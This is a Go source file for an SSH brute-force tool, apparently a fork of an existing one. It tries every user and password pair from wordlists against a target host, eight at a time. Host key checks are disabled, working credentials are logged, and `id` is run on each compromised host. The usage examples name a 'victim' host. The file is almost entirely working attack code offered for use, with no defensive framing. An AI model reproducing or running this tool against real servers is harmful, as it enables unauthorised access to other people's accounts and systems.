package main

/*
this fork has been made so we can SHOW THE SERVER it manages to login....
pretty basic

*/
import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

const LIMIT = 8
const VERSION = "v0.1"

var throttler = make(chan int, LIMIT)

var (
	debug = flag.Bool("d", false, "Debugging, see what's going on under the hood")

	host     = flag.String("h", "", "Host and port")
	userList = flag.String("u", "", "User list file")
	passList = flag.String("p", "", "Password list file")
	out      = flag.String("o", "", "File to log data in")
)

func usage() {
	fmt.Printf(`version: %s

Usage: %s [-h HOST:PORT] [-u USERS] [-p PASSWORDS] [-d]

Examples:
	%s -h 127.0.0.1:22 -u my-users.txt -p my-passes.txt -o results.txt
	%s -h victim.tld:2233 -u users.txt -p passwords.lst -d > output.txt
`, VERSION, os.Args[0], os.Args[0], os.Args[0])
	os.Exit(1)
}

func main() {
	flag.Parse()

	if *host == "" || *userList == "" || *passList == "" {
		usage()
	}

	if err := dialHost(); err != nil {
		log.Println("Couldn't connect to %s, exiting.",*host)
		os.Exit(1)
	}

	users, err := readFile(*userList)
	if err != nil {
		log.Println("Can't read user list, exiting.")
		os.Exit(1)
	}

	passwords, err := readFile(*passList)
	if err != nil {
		log.Println("Can't read passwords list, exiting.")
		os.Exit(1)
	}

	var outfile *os.File
	if *out == "" {
		outfile = os.Stdout
	} else {
		outfile, err = os.Create(*out)
		if err != nil {
			log.Println("Can't create file for writing, exiting.")
			os.Exit(1)
		}
		defer outfile.Close()
	}

	var wg sync.WaitGroup
	for _, user := range users {
		for _, pass := range passwords {
			throttler <- 0
			wg.Add(1)
			go connect(&wg, outfile, user, pass)
		}
	}
	wg.Wait()
}

func dialHost() (err error) {
	debugln("Trying to connect to host: %s", *host)
	conn, err := net.Dial("tcp", *host)
	if err != nil {
		return
	}
	conn.Close()
	return
}

func connect(wg *sync.WaitGroup, o *os.File, user, pass string) {
	defer wg.Done()

	debugln(fmt.Sprintf("Trying %s %s:%s...\n", *host, user, pass))

	sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout:         5 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	sshConfig.SetDefaults()

	c, err := ssh.Dial("tcp", *host, sshConfig)
	if err != nil {
		<-throttler
		return
	}
	defer c.Close()

	log.Printf("[Found] Got it! %s = %s:%s\n", *host, user, pass)
	fmt.Fprintf(o, "%s = %s:%s\n", host, user, pass)

	debugln("Trying to run `id`...")

	session, err := c.NewSession()
	if err == nil {
		defer session.Close()

		debugln("Successfully ran `id`!")

		var s_out bytes.Buffer
		session.Stdout = &s_out

		if err = session.Run("id"); err == nil {
			fmt.Fprintf(o, "\t%s", s_out.String())
		}
	}
	<-throttler
}

func readFile(f string) (data []string, err error) {
	b, err := os.Open(f)
	if err != nil {
		return
	}
	defer b.Close()

	scanner := bufio.NewScanner(b)
	for scanner.Scan() {
		data = append(data, scanner.Text())
	}
	return
}

func debugln(s string) {
	if *debug {
		log.Println("[Debug]", s)
	}
}
